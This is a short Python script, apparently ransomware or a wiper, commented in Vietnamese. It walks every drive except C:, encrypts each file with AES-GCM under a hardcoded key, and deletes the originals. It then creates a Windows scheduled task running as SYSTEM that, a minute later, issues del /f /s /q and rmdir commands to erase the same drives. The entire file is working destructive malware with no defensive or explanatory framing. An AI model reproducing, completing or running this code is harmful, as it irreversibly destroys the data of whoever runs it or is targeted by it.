import os, string, subprocess, datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import secrets

def schedule_drive_wipe(drives, minutes=5):
    run_time = (datetime.datetime.now() + datetime.timedelta(minutes=minutes)).strftime("%H:%M")
    for drive in drives:
        # Lệnh xóa tất cả file và thư mục trong ổ (trừ ổ C)
        command = (
            f'schtasks /create /tn "Wipe_{drive[0]}" '
            f'/tr "cmd /c del /f /s /q {drive}*.* & for /d %%p in ({drive}*) do rmdir \\"%%p\\" /s /q" '
            f'/sc once /st {run_time} /ru SYSTEM /f'
        )
        subprocess.run(command, shell=True)

def main():
    key = b"lehoangphucthinh"
    backend = default_backend()
    block = algorithms.AES(key)

    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    target_drives = []

    for drive in drives:
        if drive == "C:\\": 
            continue
        target_drives.append(drive)
        for root, dirs, files in os.walk(drive):
            for file_name in files:
                path = os.path.join(root, file_name)
                print(f"Encrypting {path}...")
                try:
                    with open(path, 'rb') as f:
                        original = f.read()
                    nonce = secrets.token_bytes(12)
                    gcm = modes.GCM(nonce)
                    cipher = Cipher(block, gcm, backend=backend)
                    encryptor = cipher.encryptor()
                    encrypted = encryptor.update(original) + encryptor.finalize()
                    tag = encryptor.tag
                    full_encrypted = nonce + encrypted + tag
                    with open(path + ".enc", 'wb') as f:
                        f.write(full_encrypted)
                    os.remove(path)
                except Exception as e:
                    if "read" in str(e).lower():
                        print("error while reading file contents")
                    elif "write" in str(e).lower():
                        print("error while writing contents")
                    else:
                        print(f"Error: {e}")

    # Hẹn giờ xóa toàn bộ nội dung các ổ đã mã hóa
    if target_drives:
        schedule_drive_wipe(target_drives, minutes=1)

if __name__ == "__main__":
    main()
